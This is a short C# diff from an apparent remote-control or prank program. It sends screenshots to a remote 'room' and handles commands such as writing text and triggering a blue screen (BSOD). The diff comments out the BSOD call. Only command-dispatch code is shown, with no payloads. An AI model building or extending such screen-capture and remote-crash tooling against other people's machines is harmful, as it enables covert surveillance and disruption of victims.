@@ -39,7 +39,7 @@ namespace GloryHole
                         await room.sendScreen(getScreenShot());
                         foreach (Command cmd in room.commands)
                         {
-                            switch (cmd.type)
+                            switch ((CommandTypes)cmd.type)
                             {
                                 case (CommandTypes.AntiVanya): /*Ели косанда анти ваня */
                                     break;
@@ -50,7 +50,7 @@ namespace GloryHole
                                 case (CommandTypes.WriteText):/*Ели текс нада написать */
                                     break;
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
-                                    BSOD();
+                                    //BSOD();
                                     break;
                             }
                         }
